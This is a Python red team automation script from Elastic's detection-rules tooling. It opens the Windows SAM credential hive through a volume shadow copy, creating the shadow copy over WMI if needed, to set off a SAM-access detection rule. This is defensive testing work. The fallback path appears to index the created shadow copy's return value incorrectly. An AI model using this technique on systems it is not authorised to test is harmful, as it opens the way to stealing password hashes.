# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

import logging

from . import OSType, register_code_rta, RuleMetadata

log = logging.getLogger(__name__)


def get_vss_list():
    import win32com.client  # type: ignore

    wcd = win32com.client.Dispatch("WbemScripting.SWbemLocator")
    wmi = wcd.ConnectServer(".", "root\\cimv2")
    obj = wmi.ExecQuery("SELECT * FROM Win32_ShadowCopy")
    return [o.DeviceObject for o in obj]


def vss_create():
    import win32com.client  # type: ignore

    wmi = win32com.client.GetObject("winmgmts:\\\\.\\root\\cimv2:Win32_ShadowCopy")
    createmethod = wmi.Methods_("Create")
    createparams = createmethod.InParameters
    createparams.Properties_[1].value = "c:\\"
    results = wmi.ExecMethod_("Create", createparams)
    return results.Properties_[1].value


@register_code_rta(
    id="b78f0255-3b97-4e39-8857-ec74d09e36ba",
    name="credaccess_sam_from_vss",
    platforms=[OSType.WINDOWS],
    siem_rules=[],
    endpoint_rules=[
        RuleMetadata(id="dc27190a-688b-4f9b-88f0-1f13deccd67f", name="Security Account Manager (SAM) File Access")
    ],
    techniques=["T1003", "T1003.002"],
)
def main():
    import win32file  # type: ignore

    vss_list = get_vss_list()
    if len(vss_list) > 0:
        sam_path = f"{vss_list[0]}\\Windows\\System32\\config\\SAM"
        log.info(f"Attempting to Open {sam_path}")
        hf = win32file.CreateFile(sam_path, win32file.GENERIC_READ, 0, None, 3, 0, None)
        if hf:
            log.info("RTA Done!")
            win32file.CloseHandle(hf)  # type: ignore
        else:
            log.info("RTA Failed")

    else:
        vss_list = vss_create()
        sam_path = f"{vss_list[0]}\\Windows\\System32\\config\\SAM"
        hf = win32file.CreateFile(sam_path, win32file.GENERIC_READ, 0, None, 3, 0, None)
        if hf:
            log.info("RTA Done!")
            win32file.CloseHandle(hf)  # type: ignore
        else:
            log.info("RTA Failed")
